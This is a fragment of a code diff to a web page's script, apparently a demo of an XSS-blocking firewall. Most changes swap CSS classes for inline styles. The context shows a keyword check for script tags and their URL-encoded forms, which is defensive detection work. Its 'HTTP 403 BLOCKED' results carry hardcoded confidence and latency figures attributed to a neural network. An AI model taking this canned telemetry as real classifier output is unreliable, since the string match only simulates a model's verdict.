         const hasScript = lower.includes('<script') || lower.includes('%3cscript') || lower.includes('%253cscript');
@@ -730,7 +862,7 @@
         if (hasScript || hasEvent || hasCookie) {
           applyTelemetry({
             badgeText: "HTTP 403 BLOCKED",
-            badgeClass: "bg-rose-500/20 text-rose-400 border border-rose-500/30",
+            badgeStyle: "background-color: var(--primatives--bubbletech-4); color: #ffffff; border: 1px solid #ffffff;",
             stage: hasScript ? "Fast-Path Lexical Analyzer" : "PyTorch Bi-LSTM Neural Core",
             confidence: "0.9992 (High Threat Confidence)",
             latency: hasScript ? "0.003 ms" : "0.480 ms",
@@ -739,7 +871,7 @@
         } else {
           applyTelemetry({
             badgeText: "HTTP 200 PROXIED",
-            badgeClass: "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30",
+            badgeStyle: "background-color: var(--primatives--neon-field-4); color: #ffffff; border: 1px solid #ffffff;",
             stage: "Fast-Path Lexical Analyzer",
             confidence: "0.0000 (Safe Payload)",
             latency: "0.002 ms",
@@ -752,10 +884,10 @@
     function switchCodeTab(tab) {
       ['curl', 'python', 'docker'].forEach(t => {
         document.getElementById(`code-${t}`).classList.add('hidden');
-        document.getElementById(`tab-${t}`).className = 'px-2.5 py-1 rounded text-slate-400 hover:text-white';
+        document.getElementById(`tab-${t}`).style.backgroundColor = 'var(--primatives--pc-plastic-3)';
       });
       document.getElementById(`code-${tab}`).classList.remove('hidden');
-      document.getElementById(`tab-${tab}`).className = 'px-2.5 py-1 rounded bg-white/10 text-white font-medium';
+      document.getElementById(`tab-${tab}`).style.backgroundColor = 'var(--primatives--pc-plastic-1)';
     }
   </script>
 
